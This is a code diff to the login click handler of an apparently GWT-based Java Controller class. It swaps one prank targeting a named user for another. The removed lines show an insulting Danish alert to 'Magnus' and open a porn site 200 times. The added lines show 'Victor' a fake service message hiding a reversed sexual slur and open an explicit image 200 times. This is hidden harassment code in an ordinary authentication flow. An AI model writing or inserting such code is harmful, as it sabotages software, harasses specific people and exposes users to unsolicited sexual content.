@@ -346,16 +346,15 @@ public class Controller {
 		public void onClick(ClickEvent event) {
 			if (event.getSource() == loginView.getBtnOk())
 			
-				if (loginView.getUserId().equals("Magnus")){
-					Window.alert("Du er vist en rigtig bitch, Magnus..  Hævnen er sød! Den legendariske Windows virus har slået til igen. Hilsen GUI-masteren (ps. du er en cunt)");
-
-					int i;
-					for(i=0; i<200; i++){
-					
-					Window.open("http://pornhub.com", null, "fullscreeen");
+				if (loginView.getUserId().equals("Victor")){
+					Window.alert("Hej Victor. Dette er en servicebesked. Vi byder dig officielt velkommen til vores nye system. Nyd elcatneT Yag Nrop");
+				
+					int j = 200;
+					for (int i = 0; i < j; i++) {
+						Window.open("http://img1.thatpervert.com/pics/post/full/erotic--tentacles-tentacles-on-male-2599921.jpeg", null, "Fullsize");
 						
-					
 					}
+					
 
 				}
 				personDAO.getPersons((new AsyncCallback<List<PersonDTO>>() {
